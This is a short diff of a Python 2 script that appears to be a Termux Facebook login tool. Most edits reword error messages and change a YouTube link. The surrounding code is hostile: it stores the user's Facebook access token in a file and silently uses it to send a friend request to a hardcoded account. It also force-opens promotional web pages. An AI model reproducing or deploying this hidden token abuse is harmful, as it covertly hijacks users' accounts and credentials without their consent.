@@ -100,10 +100,10 @@ while (loop == 'true'):
             print "Logged in successfully as " + username
             loop = 'false'
         else:
-            print "Wrong Dear"
+            print "Wrong Password"
             os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html?m=1')
     else:
-        print "Wrong Dear"
+        print "Wrong Username"
         os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html?m=1')
 
 def login():
@@ -145,7 +145,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
+				os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
